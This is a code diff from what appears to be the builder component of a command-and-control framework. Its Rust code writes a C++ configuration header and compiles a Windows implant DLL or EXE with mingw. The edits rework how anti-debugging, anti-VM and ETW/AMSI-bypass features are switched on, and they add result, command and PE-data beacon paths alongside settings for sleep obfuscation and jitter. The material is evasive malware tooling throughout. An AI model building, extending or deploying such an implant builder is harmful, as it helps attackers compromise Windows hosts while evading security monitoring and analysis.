@@ -338,6 +338,10 @@ impl AgentHandler {
             config.encrypt_memory_on_sleep
         );
 
+        let anti_debug_define = if config.anti_debug { "#define ANTI_DEBUG_ENABLED" } else { "// #define ANTI_DEBUG_ENABLED" };
+        let anti_vm_define = if config.anti_vm { "#define ANTI_VM_ENABLED" } else { "// #define ANTI_VM_ENABLED" };
+        let bypass_define = if config.bypass_etw_amsi { "#define BYPASS_ETW_AMSI" } else { "// #define BYPASS_ETW_AMSI" };
+
         let new_agent_config = format!(
             r#"#pragma once
 #include <string>
@@ -349,13 +353,13 @@ constexpr char USER_AGENT[] = "{}";
 constexpr char HEADER[] = "{}";
 constexpr char RESULTS_PATH[] = "{}";
 constexpr int BEACON_INTERVAL = {};
-constexpr bool ANTI_DEBUG_ENABLED = {};
-constexpr bool ANTI_VM_ENABLED = {};
+{}
+{}
+{}
 constexpr bool USE_HTTPS = {};
 constexpr int USE_SLEEP_OBFUSCATION = {};
 constexpr float SLEEP_JITTER_PERCENT = {};
 constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
-constexpr bool BYPASS_ETW_AMSI = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -365,13 +369,13 @@ constexpr bool BYPASS_ETW_AMSI = {};
             header_cstr,
             listener.uri_paths,
             config.beacon_interval,
-            if config.anti_debug { "true" } else { "false" },
-            if config.anti_vm { "true" } else { "false" },
+            anti_debug_define,
+            anti_vm_define,
+            bypass_define,
             if use_https { "true" } else { "false" },
             config.use_sleep_obfuscation,
             config.sleep_jitter_percent,
             config.encrypt_memory_on_sleep,
-            config.bypass_etw_amsi
         );
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
 
@@ -395,16 +399,10 @@ constexpr bool BYPASS_ETW_AMSI = {};
 
         log::info!("[+] Configuration file written to: {}", config_path);
 
-        let mut flags = String::new();
-        if config.anti_debug      { flags.push_str(" -DANTI_DEBUG_ENABLED"); }
-        if config.anti_vm         { flags.push_str(" -DANTI_VM_ENABLED"); }
-        if config.bypass_etw_amsi { flags.push_str(" -DBYPASS_AMSI_ETW_ENABLED"); }
-
         let dll_path = format!("{}/agent.dll", agent_path_str);
 
         let cmd = format!(
             "x86_64-w64-mingw32-g++ \
-                {flags} \
                 -shared \
                 -o {dll} \
                 {p}/main_dll.cpp \
@@ -420,7 +418,6 @@ constexpr bool BYPASS_ETW_AMSI = {};
                 {p}/vm_detection.cpp \
                 {p}/sleep_obfuscation.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
-            flags = flags,
             dll = dll_path,
             p = agent_path_str
         );
@@ -510,6 +507,14 @@ constexpr bool BYPASS_ETW_AMSI = {};
         );
         log::info!("    - USE_HTTPS: {}", use_https);
 
+        let anti_debug_define = if config.anti_debug { "#define ANTI_DEBUG_ENABLED" } else { "// #define ANTI_DEBUG_ENABLED" };
+        let anti_vm_define = if config.anti_vm { "#define ANTI_VM_ENABLED" } else { "// #define ANTI_VM_ENABLED" };
+        let bypass_define = if config.bypass_etw_amsi { "#define BYPASS_ETW_AMSI" } else { "// #define BYPASS_ETW_AMSI" };
+
+        let result_path = listener.uri_paths.replace("update", "result");
+        let command_path = listener.uri_paths.replace("update", "command");
+        let pe_data_path = listener.uri_paths.replace("update", "pe-data");
+
         let new_agent_config = format!(
             r#"#pragma once
 #include <string>
@@ -520,14 +525,17 @@ constexpr int XOR_PORT = {};
 constexpr char USER_AGENT[] = "{}";
 constexpr char HEADER[] = "{}";
 constexpr char RESULTS_PATH[] = "{}";
+constexpr char RESULT_PATH[] = "{}";
+constexpr char COMMAND_PATH[] = "{}";
+constexpr char PE_DATA_PATH[] = "{}";
 constexpr int BEACON_INTERVAL = {};
-constexpr bool ANTI_DEBUG_ENABLED = {};
-constexpr bool ANTI_VM_ENABLED = {};
+{}
+{}
+{}
 constexpr bool USE_HTTPS = {};
 constexpr int USE_SLEEP_OBFUSCATION = {};
 constexpr float SLEEP_JITTER_PERCENT = {};
 constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
-constexpr bool BYPASS_ETW_AMSI = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -536,14 +544,17 @@ constexpr bool BYPASS_ETW_AMSI = {};
             listener.user_agent,
             header_cstr,
             listener.uri_paths,
+            result_path,
+            command_path,
+            pe_data_path,
             config.beacon_interval,
-            if config.anti_debug { "true" } else { "false" },
-            if config.anti_vm { "true" } else { "false" },
+            anti_debug_define,
+            anti_vm_define,
+            bypass_define,
             if use_https { "true" } else { "false" },
             config.use_sleep_obfuscation,
             config.sleep_jitter_percent,
             config.encrypt_memory_on_sleep,
-            if config.bypass_etw_amsi { "true" } else { "false" },
         );
 
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
@@ -568,16 +579,10 @@ constexpr bool BYPASS_ETW_AMSI = {};
 
         log::info!("[+] Configuration file written to: {}", config_path);
 
-        let mut flags = String::new();
-        if config.anti_debug      { flags.push_str(" -DANTI_DEBUG_ENABLED"); }
-        if config.anti_vm         { flags.push_str(" -DANTI_VM_ENABLED"); }
-        if config.bypass_etw_amsi { flags.push_str(" -DBYPASS_AMSI_ETW_ENABLED"); }
-
         let exe_path = format!("{}/agent.exe", agent_path_str);
 
         let cmd = format!(
             "x86_64-w64-mingw32-g++ \
-                {flags} \
                 -o {exe} \
                 {p}/main_exe.cpp \
                 {p}/base64.cpp \
@@ -592,7 +597,6 @@ constexpr bool BYPASS_ETW_AMSI = {};
                 {p}/vm_detection.cpp \
                 {p}/sleep_obfuscation.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
-            flags = flags,
             exe = exe_path,
             p = agent_path_str
         );
